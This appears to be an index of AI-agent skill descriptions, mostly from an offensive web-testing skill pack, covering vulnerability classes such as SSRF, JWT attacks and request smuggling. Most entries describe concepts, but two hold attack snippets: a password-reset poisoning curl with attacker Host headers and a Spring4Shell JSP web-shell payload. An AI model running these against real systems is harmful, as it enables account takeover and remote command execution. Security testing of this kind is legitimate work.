- **vulnerabilities-cors**: CORS misconfigurations are one of the most common bug bounty findings. - **vulnerabilities-crlf-injection**: CRLF = Carriage Return `\r` (0x0D) + Line Feed `\n` (0x0A). Injecting these into HTTP headers breaks response parsing → inject arbitrary headers, split responses, set cookies, achieve XSS. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-crlf-injection))
- **vulnerabilities-csrf**: Cross-site request forgery abuses ambient authority (cookies, HTTP auth) across origins. Do not rely on CORS alone; enforce non-replayable tokens and strict origin checks for every state change. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-csrf))

- **vulnerabilities-deserialization**: Deserialization converts stored/transmitted data back into objects. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-deserialization))

([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-exploitation))
- **vulnerabilities-grpc**: gRPC is a high-performance, open-source universal RPC framework developed by Google. Because data is serialized in a binary format rather than plaintext (like JSON/XML), testing tools need specific support, and ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-grpc))
- **vulnerabilities-host-header-injection**: Host header injection = manipulating the HTTP `Host` header to poison password resets, bypass routing, perform SSRF, or poison caches. One of the most common high-severity bug bounty findings. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-host-header-injection))
- **vulnerabilities-http-smuggling**: HTTP request smuggling exploits disagreements between front-end (load balancer/CDN) and back-end (application server) about where one HTTP request ends and the next begins. This allows attackers to inject requests that poison back-end queues — bypassing security controls, hijacking sessions, and achieving cache poisoning or RCE escalation. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-http-smuggling))
- **vulnerabilities-idor**: Object-level authorization failures (BOLA/IDOR) lead to cross-account data exposure and unauthorized state changes across APIs, web, mobile, and microservices. Treat every object reference as untrusted until proven bound to the caller. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-idor))
- **vulnerabilities-information-disclosure**: Information leaks accelerate exploitation by revealing code, configuration, identifiers, and trust boundaries. Treat every response byte, artifact, and header as potential intelligence. Minimize, normalize, and scope disclosure across all channels. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-information-disclosure))
- **vulnerabilities-insecure-file-uploads**: Upload surfaces are high risk: server-side execution (RCE), stored XSS, malware distribution, storage takeover, and DoS. Modern stacks mix direct-to-cloud uploads, background processors, and CDNs—authorization and validation must hold across every step. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-insecure-file-uploads))
- **vulnerabilities-jwt-attacks**: Complete methodology for testing JSON Web Token vulnerabilities: alg:none, RS256→HS256 confusion, weak secrets, kid injection, JWK injection. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-jwt-attacks))
- **vulnerabilities-kubernetes**: Kubernetes (K8s) is the industry standard for container orchestration. Due to its sheer complexity, massive attack surface, and default "flat" networking model, it presents numerous opportunities for privilege escalation, lateral movement, and complete cluster takeover once initial access (e.g., an RCE in a single pod) is achieved. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-kubernetes))
- **vulnerabilities-mass-assignment**: Mass assignment binds client-supplied fields directly into models/DTOs without field-level allowlists. It commonly leads to privilege escalation, ownership changes, and unauthorized state transitions in modern APIs and GraphQL. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-mass-assignment))
- **vulnerabilities-nosql-injection**: NoSQL injection = inject operators into JSON/BSON queries to bypass authentication, extract data, or execute commands. Most common: MongoDB `$ne`, `$gt`, `$regex`, `$where`. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-nosql-injection))
- **vulnerabilities-oauth-misconfig**: Test OAuth flows for open redirect ATO, state bypass, token leakage, PKCE bypass, implicit flow abuse. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-oauth-misconfig))
- **vulnerabilities-oauth-saml**: OAuth 2.0 and SAML 2.0 are complex Single Sign-On (SSO) and authorization protocols. Due to their complexity, misconfigurations and implementation flaws are common, leading to critical vulnerabilities such as authentication bypass, account takeover (ATO), and privilege escalation. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-oauth-saml))
- **vulnerabilities-open-redirect**: Open redirects enable phishing, OAuth/OIDC code and token theft, and allowlist bypass in server-side fetchers that follow redirects. Treat every redirect target as untrusted: canonicalize and enforce exact allowlists per scheme, host, and path. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-open-redirect))
- **vulnerabilities-password-reset-poisoning**: curl -s -X POST "$TARGET_URL" \ -H "Host: ATTACKER" \ -H "X-Forwarded-Host: ATTACKER" \ -H "Content-Type: application/x-www-form-urlencoded" \ --data "email=[email removed]" \ | tee /workspace/output/TARGET_reset_host_poison.txt ``` ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-password-reset-poisoning))
- **vulnerabilities-path-traversal**: Improper file path handling and dynamic inclusion enable sensitive file disclosure, config/source leakage, SSRF pivots, and code execution. Treat all user-influenced paths, names, and schemes as untrusted; normalize and bind them to an allowlist or eliminate user control entirely. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-path-traversal))
- **vulnerabilities-privilege-escalation**: After gaining initial access, the goal is to elevate privileges to root/SYSTEM. Enumerate thoroughly before attempting any exploit — most PE is logic abuse, not CVE exploitation. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-privilege-escalation))
- **vulnerabilities-prototype-pollution**: Prototype pollution lets attackers inject properties into the JavaScript Object prototype, causing those properties to appear on every object in the runtime. Client-side: leads to DOM XSS via gadgets. Server-side (Node.js): leads to RCE, auth bypass, or privilege escalation. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-prototype-pollution))
- **vulnerabilities-race-conditions**: Concurrency bugs enable duplicate state changes, quota bypass, financial abuse, and privilege errors. Treat every read–modify–write and multi-step workflow as adversarially concurrent. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-race-conditions))
- **vulnerabilities-rce**: Remote code execution leads to full server control when input reaches code execution primitives: OS command wrappers, dynamic evaluators, template engines, deserializers, media pipelines, and build/runtime tooling. Focus on quiet, portable oracles and chain to stable shells only when needed. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-rce))
- **vulnerabilities-scan**: Check this repo's NuGet dependency tree for known vulnerabilities via `dotnet list package --vulnerable`, and fix them by editing the centrally-managed version in Directory.Packages.props. Use when asked to check this repo for dependency vulnerabilities, clear NuGet advisories, or address this repo's GitHub security/dependabot page. ([TacticusPlanner/tacticus-planner-api](https://github.com/TacticusPlanner/tacticus-planner-api/tree/HEAD/.agents/skills/vulnerabilities-scan) · ★12 · 2 copies)
- **vulnerabilities-sensitive-file-pii-exposure**: Sensitive document exposure is consistently one of the highest-impact, easiest-to-confirm bug bounty findings. The pattern is always the same: 1. Application stores sensitive documents in a publicly reachable location 2. An index/enumeration mechanism (CMS REST API, S3 listing, directory index) is also public 3. Document filenames or content contain PII (names, national IDs, phone numbers, financi ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-sensitive-file-pii-exposure))

- **vulnerabilities-spring4shell**: PAYLOAD='&lt;% if ("cmd".equals(request.getParameter("cmd"))) { java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %&gt;' ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-spring4shell))
- **vulnerabilities-sql-injection**: SQLi remains one of the most durable and impactful vulnerability classes. Modern exploitation focuses on parser differentials, ORM/query-builder edges, JSON/XML/CTE/JSONB surfaces, out-of-band exfiltration, and subtle blind channels. Treat every string concatenation into SQL as suspect. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-sql-injection))
- **vulnerabilities-ssrf**: Server-Side Request Forgery enables the server to reach networks and services the attacker cannot. Focus on cloud metadata endpoints, service meshes, Kubernetes, and protocol abuse to turn a single fetch into credentials, lateral movement, and sometimes RCE. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-ssrf))
- **vulnerabilities-ssti**: SSTI occurs when user input is embedded directly into a server-side template and evaluated. Unlike XSS, SSTI executes on the server, often leading to RCE. Treat every endpoint that reflects input in dynamic pages as a potential SSTI surface. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-ssti))
- **vulnerabilities-subdomain-takeover**: Subdomain takeover lets an attacker serve content from a trusted subdomain by claiming resources referenced by dangling DNS (CNAME/A/ALIAS/NS) or mis-bound provider configurations. Consequences include phishing on a trusted origin, cookie and CORS pivot, OAuth redirect abuse, and CDN cache poisoning. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-subdomain-takeover))
- **vulnerabilities-supply-chain**: Supply chain attacks target the software development lifecycle (SDLC), tools, and external dependencies used by an organization rather than attacking the production application directly. A successful supply chain attack can compromise thousands of downstream consumers simultaneously (e.g., SolarWinds, Codecov). ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-supply-chain))
- **vulnerabilities-unhandled-exception-differential**: This is **not** about exploiting a bug to gain access. It is about proving that an exception handler is **missing** in a security-critical code path. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-unhandled-exception-differential))
- **vulnerabilities-waf-detection**: Check response body for WAF block pages: - "403 Forbidden" - "Access Denied" - "Security Check" - "Attack Detected" ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-waf-detection))
- **vulnerabilities-web-cache-poisoning**: Cache attacks work by making the cache store and serve a malicious response to other users, or by tricking the cache into serving another user's private data to the attacker. Impact: stored XSS across the entire application, account takeover, DoS. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-web-cache-poisoning))
- **vulnerabilities-websocket**: WebSockets provide full-duplex communication channels over a single TCP connection. Because they differ significantly from standard HTTP request-response patterns, they often bypass traditional security controls (like WAFs) and suffer from unique implementation flaws ranging from Cross-Site WebSocket Hijacking (CSWSH) to complex smuggling and injection attacks. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-websocket))
- **vulnerabilities-xss**: Cross-site scripting persists because context, parser, and framework edges are complex. Treat every user-influenced string as untrusted until it is strictly encoded for the exact sink and guarded by runtime policy (CSP/Trusted Types). ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-xss))
- **vulnerabilities-xxe**: XML External Entity injection is a parser-level failure that enables local file reads, SSRF to internal control planes, denial-of-service via entity expansion, and in some stacks, code execution through XInclude/XSLT or language-specific wrappers. Treat every XML input as untrusted until the parser is proven hardened. ([kjkortes/a.e.g.i.s](https://github.com/kjkortes/a.e.g.i.s/tree/HEAD/packages/skills/skills/offensive/airecon-fork/vulnerabilities-xxe))
